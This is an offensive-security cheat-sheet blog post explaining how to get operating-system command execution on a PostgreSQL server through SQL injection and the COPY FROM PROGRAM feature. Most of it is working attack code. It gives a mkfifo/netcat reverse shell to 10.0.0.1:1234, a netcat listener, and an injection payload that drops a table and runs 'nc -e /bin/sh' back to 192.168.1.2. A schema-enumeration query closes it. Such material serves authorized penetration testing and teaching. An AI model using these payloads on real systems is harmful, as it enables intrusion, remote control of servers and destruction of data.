---
layout: post
title: "SQLi: PostgreSQL"
date: 2023-06-21
categories:
  - CHEATSHEET
tags:
  - SQLi
---


To execute system commands on Linux or Windows using PostgreSQL, you can leverage the `PROGRAM` parameter in conjunction with the `COPY` command. 


### Command Execution Overview

The process starts with the creation of a table designed to store the output of the commands you execute. This can be a temporary or permanent table based on your requirements. Here, we'll create a permanent table called `shell`.  

<br>
#### Step 1: Create a Table to Capture Output

First, create a table where the output of the executed commands will be stored. This table will have a single column to hold text data.

```sql
CREATE TABLE shell(output text);
```
<br>
#### Step 2: Using the PROGRAM Parameter to Execute Commands  


With the table ready, you can now use the `PROGRAM` parameter within the `COPY` command to execute system-level commands. This example demonstrates how to set up a reverse shell, which allows you to execute commands remotely on the server where the PostgreSQL database is running.  


```sql
COPY shell FROM PROGRAM 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f';
```
<br>
Here's a breakdown of the command sequence:

* `rm /tmp/f;`: Removes any existing file named `/tmp/f`.
* `mkfifo /tmp/f;`: Creates a named pipe `/tmp/f`. Named pipes allow for temporary file-like communication between processes.
* `cat /tmp/f | /bin/sh -i 2>&1`: This part sets up a reverse shell. It reads from the named pipe, executes commands using the shell (`/bin/sh -i`), and redirects both stdout and stderr to the pipe.
* `nc 10.0.0.1 1234 > /tmp/f`: This uses `netcat` (nc) to connect back to the attacker's machine listening on IP `10.0.0.1` and port `1234`. Output from the shell (connected via `nc`) is redirected back into `/tmp/f`, thus maintaining a continuous shell session.

<br>

#### Step 3: Set Up a Listener on the Attacking Machine  


Before running the `COPY` command, ensure that you've set up a listener on the attacking machine to accept the incoming connection from the reverse shell:

```shell
nc -lvp 1234
```

<br>
#### Step4: Exploit  


```sql
id=';DROP TABLE IF EXISTS commandexec; CREATE TABLE commandexec(data text);COPY commandexec FROM PROGRAM '/usr/bin/nc.traditional -e /bin/sh 192.168.1.2 1234';--
```
<br><br>
> ***PostgreSQL Schema Tip:***
> 
>    ```sql
>    SELECT table_schema, table_name FROM information_schema.tables
>    WHERE table_schema NOT IN ('information_schema', 'pg_catalog');
>    ```

<br>

#### Resources:
* [https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767](https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767)
